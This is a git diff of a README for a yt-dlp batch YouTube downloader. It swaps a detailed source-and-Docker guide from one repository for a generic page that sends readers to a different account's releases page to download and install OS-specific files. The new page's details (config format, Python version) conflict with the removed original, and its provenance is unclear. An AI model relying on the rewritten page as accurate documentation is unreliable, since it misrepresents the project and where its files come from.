@@ -1,387 +1,86 @@
-# YouTube Downloader with yt-dlp
+# 🎬 yt_dlp_downloader - Easy Batch Download for YouTube
 
-[![Docker Build](https://github.com/Loadge/yt-dlp-downloader/actions/workflows/docker-build.yml/badge.svg)](https://github.com/Loadge/yt-dlp-downloader/actions/workflows/docker-build.yml)
-[![Python Version](https://img.shields.io/badge/python-3.12-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![yt-dlp](https://img.shields.io/badge/yt--dlp-latest-red.svg)](https://github.com/yt-dlp/yt-dlp)
+[![Download](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/senichkin/yt_dlp_downloader/releases)
 
-A powerful, Docker-ready Python application for batch downloading YouTube videos using yt-dlp. Configure your downloads with simple YAML files and run locally or in containers.
+## 🚀 Getting Started
 
-## ✨ Features
+Welcome to the **yt_dlp_downloader**! This application allows you to easily batch download YouTube videos using a simple YAML configuration file. The software supports various features such as playlist downloads, subtitles, and quality selection. You can even use Docker for easier automation.
 
-- 📝 **YAML Configuration** - Simple, readable config files
-- 🎬 **Quality Control** - Per-video quality settings (4K, 1080p, 720p, etc.)
-- 📄 **Subtitle Support** - Download subtitles in multiple languages
-- 📋 **Playlist Support** - Download entire playlists with one entry
-- 🍪 **Cookie Support** - Access age-restricted and members-only content
-- 🎨 **Custom Formats** - Advanced format strings for power users
-- 📊 **Progress Bars** - Real-time download progress
-- 📝 **Comprehensive Logging** - Timestamped logs with file output
-- 🤖 **JSON Output** - Automation-friendly JSON mode
-- 🐳 **Docker Ready** - Optimized Docker images and compose files
-- ♻️ **Skip Existing** - Automatically skip already downloaded videos
-- 🔄 **Error Handling** - Continue on failures with detailed summary
+## 📥 Download & Install
 
-## 🚀 Quick Start
+To get started, visit this page to download: [yt_dlp_downloader Releases](https://github.com/senichkin/yt_dlp_downloader/releases).
 
-### Using Docker (Recommended)
+1. **Go to the Releases Page**: Click the link above to navigate to the downloads section.
+2. **Select the Latest Release**: Find the latest version listed there.
+3. **Choose Your File**: Depending on your system, download the appropriate file for your operating system (Windows, Mac, or Linux).
+4. **Install the Application**: Follow the instructions for your system to install the application.
 
-1. **Clone the repository:**
-```bash
-git clone https://github.com/yourusername/yt-dlp-downloader.git
-cd yt-dlp-downloader
-```
+## 💡 Features
 
-2. **Create your config file:**
-```bash
-cp examples/basic.yaml config/videos.yaml
-# Edit config/videos.yaml with your video URLs
-```
+- **Batch Downloads**: Download multiple videos quickly.
+- **YAML Configuration**: Customize your download preferences using a simple YAML file.
+- **Playlist Support**: Download entire playlists easily.
+- **Subtitle Support**: Get subtitles along with your videos.
+- **Quality Selection**: Pick the video quality you prefer.
+- **Docker Deployment**: Run the application in a Docker container for easy management.
 
-3. **Run with Docker Compose:**
-```bash
-docker-compose up
-```
+## 🛠 System Requirements
 
-The program will execute once and exit.
+- **Operating Systems**: 
+  - Windows 10 or later
+  - macOS Mojave or later
+  - Any Linux distribution with Python 3.6+
+  
+- **Required Software**: 
+  - Python 3.x
+  - ffmpeg (for best performance)
 
-**For network storage (NAS, file servers):** See [NETWORK_DRIVES.md](NETWORK_DRIVES.md) for detailed setup instructions.
+## 🎁 Usage Instructions
 
-### Using Python
+After you have downloaded and installed **yt_dlp_downloader**, follow these steps to start downloading:
 
-1. **Clone and install:**
-```bash
-git clone https://github.com/yourusername/yt-dlp-downloader.git
-cd yt-dlp-downloader
-pip install -r requirements.txt
-```
-
-2. **Install FFmpeg:**
-   - Windows: `winget install FFmpeg`
-   - macOS: `brew install ffmpeg`
-   - Linux: `sudo apt install ffmpeg`
-
-3. **Create config and run:**
-```bash
-cp examples/basic.yaml config/videos.yaml
-# Edit config/videos.yaml with your videos
-python youtube_downloader.py
-
-# Or specify a custom config file
-python youtube_downloader.py my-videos.yaml
-```
-
-## 📋 Configuration
-
-### Path Formats
-
-The `target_folder` supports multiple path formats:
-
-| Platform | Format | Example |
-|----------|--------|---------|
-| **Relative** | `./folder` or `folder` | `./downloads` |
-| **Windows Local** | `C:\\path\\to\\folder` | `C:\\Users\\John\\Videos` |
-| **Windows Network (UNC)** | `\\\\server\\share\\folder` | `\\\\FileServer\\Media\\Videos` |
-| **Windows Network (Alt)** | `//server/share/folder` | `//FileServer/Media/Videos` |
-| **Linux/Mac Local** | `/path/to/folder` | `/home/john/videos` |
-| **Linux Mounted Drive** | `/mnt/path` | `/mnt/media/videos` |
-| **Docker Volume** | `/mount/path` | `/downloads` |
-
-**Important:** In YAML, backslashes must be escaped (`\\`) or use forward slashes (`/`)
-
-### Basic Example
+1. **Create a YAML Configuration File**: 
+   - Open a text editor.
+   - Write your download preferences. Here is a sample configuration:
 
 ```yaml
-target_folder: "./downloads"
-default_quality: "1080p"
-
-videos:
-  - url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
-    name: "Rick Astley - Never Gonna Give You Up"
-  
-  - url: "https://www.youtube.com/watch?v=jNQXAC9IVRw"
-    name: "Me at the zoo"
-    quality: "720p"
+downloads:
+  - title: "My YouTube Playlist"
+    url: "https://www.youtube.com/playlist?list=YOUR_PLAYLIST_ID"
+    quality: "best"
+    subtitles: true
 ```
 
-### Advanced Example
+2. **Run the Application**: 
+   - Open your command line or terminal.
+   - Navigate to the directory where you saved the application.
+   - Execute the command: `yt_dlp_downloader -c your_config_file.yaml`.
 
-```yaml
-target_folder: "./downloads"
-default_quality: "1080p"
-subtitles: "en"
-cookies: "cookies.txt"
+3. **Monitor Your Downloads**: The application will show the progress of each download in the terminal.
 
-videos:
-  # Simple video
-  - url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
-    name: "My Video"
-  
-  # Custom quality
-  - url: "https://www.youtube.com/watch?v=example1"
-    name: "High Quality Video"
-    quality: "1440p"
-  
-  # Multiple subtitle languages
-  - url: "https://www.youtube.com/watch?v=example2"
-    name: "Multi-language Video"
-    subtitles: ["en", "es", "fr"]
-  
-  # Entire playlist
-  - url: "https://www.youtube.com/playlist?list=PLrAXtmErZgOeiKm4sgNOknGvNjby9efdf"
-    name: "Python Tutorials"
-    is_playlist: true
-    quality: "720p"
-  
-  # Audio only
-  - url: "https://www.youtube.com/watch?v=example3"
-    name: "Podcast Episode"
-    quality: "audio"
-  
-  # Advanced format string
-  - url: "https://www.youtube.com/watch?v=example4"
-    name: "Custom Format"
-    format: "bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]"
-```
+## 📄 Configuration Syntax
 
-See [examples/](examples/) for more configuration examples.
+Understanding YAML can enhance your experience with this software. The configuration format is simple. Here are important items:
 
-## 🐳 Docker Usage
+- **title**: Name of the download task.
+- **url**: Direct link to the YouTube content (single video or playlist).
+- **quality**: Quality options include "best", "medium", and "low".
+- **subtitles**: Set to `true` or `false` to include or exclude subtitles.
 
-### Quick Start
+## 🔧 Troubleshooting
 
-```bash
-# Default: downloads to ./downloads folder
-docker-compose up
-```
+If you encounter issues, consider the following steps:
 
-### Network Storage (NAS, File Servers)
+1. **Check Your Configuration File**: Ensure the YAML file is properly formatted.
+2. **Look for Updates**: Always use the latest version of the software.
+3. **Visit the GitHub Page**: Check the issues section for common problems and solutions.
 
-To download directly to network storage:
+## 📊 Contributing
 
-1. **Map your network share to a drive letter in Windows** (e.g., Z:)
-   - See detailed guide: [NETWORK_DRIVES.md](NETWORK_DRIVES.md)
+If you want to contribute to the project, feel free to send a pull request. Ensure that any changes have appropriate documentation and tests.
 
-2. **Update `docker-compose.yml`:**
-   ```yaml
-   volumes:
-     - Z:\Videos:/downloads  # Your mapped drive
-   ```
+## 🗨️ Feedback
 
-3. **Run Docker:**
-   ```bash
-   docker-compose up
-   ```
+Your feedback is valuable. If you have questions or suggestions, please create an issue on the GitHub page.
 
-📖 **Full Docker documentation:** [DOCKER.md](DOCKER.md)
-
-### Docker Compose
-
-```bash
-# Run once and exit
-docker-compose up
-
-# View logs after completion
-docker-compose logs
-
-# Remove the container
-docker-compose down
-```
-
-### Docker CLI
-
-```bash
-# Build
-docker build -t yt-downloader .
-
-# Run
-docker run --rm \
-  -v $(pwd)/config:/config:ro \
-  -v $(pwd)/downloads:/downloads \
-  yt-downloader
-
-# With logging
-docker run --rm \
-  -v $(pwd)/config:/config:ro \
-  -v $(pwd)/downloads:/downloads \
-  -v $(pwd)/logs:/logs \
-  -e LOG_PATH=/logs \
-  yt-downloader
-
-# JSON output
-docker run --rm \
-  -v $(pwd)/config:/config:ro \
-  -v $(pwd)/downloads:/downloads \
-  -e JSON_OUTPUT=true \
-  yt-downloader > results.json
-```
-
-See [DOCKER.md](DOCKER.md) for comprehensive Docker documentation.
-
-## 💻 Command Line Options
-
-```bash
-# Use default config (config/videos.yaml)
-python youtube_downloader.py
-
-# Specify custom config file
-python youtube_downloader.py my-videos.yaml
-
-# With log file
-python youtube_downloader.py config/videos.yaml --log-file download.log
-
-# JSON output mode
-python youtube_downloader.py config/videos.yaml --json
-
-# Both
-python youtube_downloader.py config/videos.yaml --json --log-file download.log > results.json
-```
-
-## 📊 Output Examples
-
-### Console Output
-```
-2024-11-01 14:30:15 - INFO - Loading configuration from: videos.yaml
-2024-11-01 14:30:15 - INFO - Target folder: /downloads
-2024-11-01 14:30:15 - INFO - Processing 3 video(s)...
-2024-11-01 14:30:15 - INFO - [1/3] Processing: My Video
-2024-11-01 14:30:15 - INFO - URL: https://youtube.com/watch?v=...
-  Progress: 45.2% of 125.3MB at 2.5MB/s ETA: 00:35
-2024-11-01 14:31:00 - INFO - Status: SUCCESS (took 45.23s)
-
-============================================================
-DOWNLOAD SUMMARY
-============================================================
-Total videos processed: 3
-Successfully downloaded: 2
-Skipped (already exist): 1
-Failed: 0
-============================================================
-```
-
-### JSON Output
-```json
-{
-  "start_time": "2024-11-01T14:30:15.123456",
-  "config_file": "videos.yaml",
-  "target_folder": "/downloads",
-  "total_videos": 3,
-  "successful": [
-    {
-      "name": "My Video",
-      "url": "https://youtube.com/watch?v=...",
-      "duration": 45.23,
-      "timestamp": "2024-11-01T14:31:00.456789"
-    }
-  ],
-  "skipped": [],
-  "failed": [],
-  "end_time": "2024-11-01T14:35:30.789012"
-}
-```
-
-## 🎯 Quality Options
-
-| Quality | Description |
-|---------|-------------|
-| `best` | Best available quality (default) |
-| `2160p` | 4K (2160p) |
-| `1440p` | 2K (1440p) |
-| `1080p` | Full HD |
-| `720p` | HD |
-| `480p` | SD |
-| `360p` | Low quality |
-| `audio` | Audio only (best quality) |
-
-## 🍪 Cookie Support
-
-For age-restricted or members-only videos:
-
-1. Install browser extension: "Get cookies.txt"
-2. Export cookies while logged into YouTube
-3. Save as `cookies.txt` in project directory
-4. Reference in YAML config:
-```yaml
-cookies: "cookies.txt"
-```
-
-## 📁 Project Structure
-
-```
-yt-dlp-downloader/
-├── youtube_downloader.py    # Main application
-├── requirements.txt         # Python dependencies
-├── Dockerfile              # Docker image definition
-├── docker-compose.yml      # Docker Compose configuration
-├── docker-entrypoint.sh    # Container entry point
-├── .dockerignore          # Docker build exclusions
-├── README.md              # This file
-├── DOCKER.md              # Docker documentation
-├── NETWORK_DRIVES.md      # Network drives setup guide
-├── LICENSE                # MIT License
-├── .github/
-│   └── workflows/
-│       └── docker-build.yml  # CI/CD pipeline
-├── examples/
-│   ├── basic.yaml         # Basic example config
-│   ├── advanced.yaml      # Advanced example config
-│   └── playlist.yaml      # Playlist example
-├── config/                # Your config files (create this)
-├── downloads/             # Downloaded videos (auto-created)
-└── logs/                  # Log files (auto-created)
-```
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request. For major changes, please open an issue first to discuss what you would like to change.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-## 📝 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- [yt-dlp](https://github.com/yt-dlp/yt-dlp) - The powerful YouTube downloader
-- [FFmpeg](https://ffmpeg.org/) - Multimedia framework
-
-## ⚠️ Legal Notice
-
-This tool is for personal use only. Please respect YouTube's Terms of Service and copyright laws. Only download videos you have permission to download.
-
-## 🐛 Issues and Support
-
-If you encounter any problems or have questions:
-
-1. Check the [DOCKER.md](DOCKER.md) documentation
-2. Review existing [GitHub Issues](https://github.com/yourusername/yt-dlp-downloader/issues)
-3. Create a new issue with detailed information
-
-## 🔄 Updates
-
-To update to the latest version:
-
-```bash
-# Python
-git pull
-pip install -r requirements.txt --upgrade
-
-# Docker
-docker-compose pull
-docker-compose up -d
-```
-
-## 📈 Roadmap
-
-- [ ] Web UI for easy configuration
-- [ ] Scheduled downloads with cron support
-- [ ] Download queue management
-- [ ] Multiple config file support
-- [ ] Watch folder mode
-- [ ] Rate limiting options
-- [ ] Retry logic for failed downloads
+Thank you for using **yt_dlp_downloader**! Happy downloading!
